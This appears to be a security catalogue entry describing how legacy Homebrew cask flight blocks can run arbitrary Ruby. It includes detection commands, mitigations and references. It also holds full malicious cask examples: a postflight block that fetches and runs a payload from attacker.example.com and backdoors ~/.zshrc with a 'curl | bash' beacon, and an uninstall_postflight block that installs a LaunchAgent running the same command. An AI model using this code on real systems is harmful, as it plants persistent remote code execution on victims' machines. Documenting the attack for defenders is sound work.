---
name: "Legacy Cask Flight Block Arbitrary Ruby Execution"
packageManager: "brew"
slug: "brew-cask-flight-blocks"
category: "Code Execution"
severity: "high"
platform:
  - "macOS"
description: "Homebrew historically supported `preflight`, `postflight`, `uninstall_preflight`, and `uninstall_postflight` blocks containing arbitrary Ruby. Official Homebrew taps now reject those legacy blocks and require structured `*flight_steps`, whose blocks accept only supported step calls with literal arguments and cannot run arbitrary Ruby. Legacy Ruby blocks remain temporarily available for third-party tap compatibility. Since Homebrew 6.0.0, a non-official cask must also be explicitly trusted before Homebrew loads it."
descriptionCitations: [1, 2, 3]
prerequisites:
  - "Ability to publish or modify a cask in a third-party tap that still uses legacy Ruby flight blocks"
  - "Victim installs the fully qualified cask, explicitly trusts it, or previously trusted its entire tap"
  - "Write access to the cask tap via PR merge, compromised maintainer account, or typo-squat"
prerequisitesCitations: [1, 2, 3]
attackScenarios:
  - title: "postflight Block Executing a Shell One-liner"
    description: "An attacker publishes a third-party cask with a legacy `postflight` stanza that runs Ruby after the application is staged. Homebrew's official taps reject this form, but temporary compatibility support allows it in a third-party cask after the user explicitly trusts that cask or its tap."
    citations: [1, 2, 3]
    commands:
      - label: "Malicious Cask Ruby file"
        code: |
          cask "productivity-suite" do
            version "2.4.1"
            sha256 "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

            url "https://example.com/productivity-suite-#{version}.dmg"
            name "Productivity Suite"
            homepage "https://example.com/productivity-suite"

            app "Productivity Suite.app"

            postflight do
              # Legacy arbitrary Ruby runs after the app is copied.
              require "net/http"
              stage = "/tmp/.ps_stage"
              system "curl", "-fsSL", "-o", stage, "https://attacker.example.com/stage2"
              system "chmod", "+x", stage
              system stage, "&"

              # Backdoor the user's shell init
              rc = "#{ENV["HOME"]}/.zshrc"
              beacon = %Q(\n# productivity-suite helper\n(curl -fsSL https://attacker.example.com/b | bash) >/dev/null 2>&1 &\n)
              File.open(rc, "a") { |f| f.write(beacon) } unless File.read(rc).include?("productivity-suite helper") rescue nil
            end
          end
        language: "ruby"
      - label: "Victim installs the cask"
        code: |
          brew install --cask attacker/tools/productivity-suite
          # .app lands in /Applications; postflight runs the Ruby block silently
        language: "bash"
  - title: "uninstall_postflight Triggering on Removal"
    description: "A legacy `uninstall_postflight` block in a third-party cask runs during `brew uninstall --cask`, creating another execution point during removal. Structured `uninstall_postflight_steps` do not permit this arbitrary Ruby."
    citations: [1, 2, 3]
    commands:
      - label: "uninstall_postflight persistence"
        code: |
          cask "productivity-suite" do
            # ... version/url/sha256/app as above ...

            uninstall_postflight do
              plist = "#{ENV["HOME"]}/Library/LaunchAgents/com.ps.helper.plist"
              File.write(plist, <<~PLIST)
                <?xml version="1.0" encoding="UTF-8"?>
                <plist version="1.0"><dict>
                  <key>Label</key><string>com.ps.helper</string>
                  <key>ProgramArguments</key>
                  <array><string>/bin/bash</string><string>-c</string>
                  <string>curl -fsSL https://attacker.example.com/b | bash</string></array>
                  <key>RunAtLoad</key><true/>
                </dict></plist>
              PLIST
              system "launchctl", "load", "-w", plist
            end
          end
        language: "ruby"
detection:
  - title: "Dump cask Ruby with brew cat before installing"
    description: "Inspect third-party cask source for legacy flight-block names. Distinguish them from structured names ending in `_steps`; the structured forms cannot call arbitrary Ruby. Separately review `installer script:`, `pkg`, and `sudo: true` for installer execution risk."
    citations: [1, 2, 3]
    commands:
      - code: |
          brew cat --cask productivity-suite | \
            grep -nE "preflight|postflight|uninstall_preflight|uninstall_postflight|installer|allow_untrusted|sudo"
        language: "bash"
  - title: "Watch cask taps for newly-added flight blocks"
    description: "Alert on third-party tap changes that add a legacy `postflight do` or `uninstall_postflight do` block. Structured `postflight_steps` and `uninstall_postflight_steps` should be reviewed for their permitted filesystem operations but are not arbitrary Ruby execution."
    citations: [1, 2, 3]
    commands:
      - code: |
          cd "$(brew --repository)/Library/Taps/attacker/homebrew-tools"
          git log -p --all -S "postflight do" -- Casks/
        language: "bash"
  - title: "Monitor LaunchAgents/LaunchDaemons written during cask install"
    description: "A plist appearing in a launch-agent directory during a third-party cask installation is a useful signal to investigate alongside the cask source and installer artifacts."
    citations: [1, 2, 3]
    commands:
      - code: |
          fswatch -0 ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons | \
            xargs -0 -n1 -I{} echo "plist change: {}"
        language: "bash"
mitigation:
  - "Before installing a cask, run `brew cat --cask <name>` and confirm no unexpected `postflight`/`preflight` blocks"
  - "Prefer casks from official Homebrew taps, which reject legacy Ruby flight blocks"
  - "For a non-official cask, prefer item-level trust over trusting the entire tap"
  - "Set `HOMEBREW_NO_AUTO_UPDATE=1` in CI and pin cask taps to a known-good commit"
  - "Do not run `brew install --cask` as an admin user - drop to a standard account so `sudo` prompts are visible"
  - "Monitor `~/Library/LaunchAgents`, `/Library/LaunchAgents`, and `/Library/LaunchDaemons` for plists created during brew runs"
  - "Remove unused third-party cask taps (`brew untap`) to shrink the attack surface"
mitigationCitations: [1, 2, 3]
references:
  - title: "Homebrew Cask Cookbook - Structured Flight Steps"
    url: "https://docs.brew.sh/Cask-Cookbook#stanza-flight_steps"
  - title: "Homebrew Security and Supply Chain"
    url: "https://docs.brew.sh/Homebrew-Security-and-Supply-Chain"
  - title: "Homebrew Tap Trust"
    url: "https://docs.brew.sh/Tap-Trust"
created: 2026-04-21
updated: 2026-10-14
---
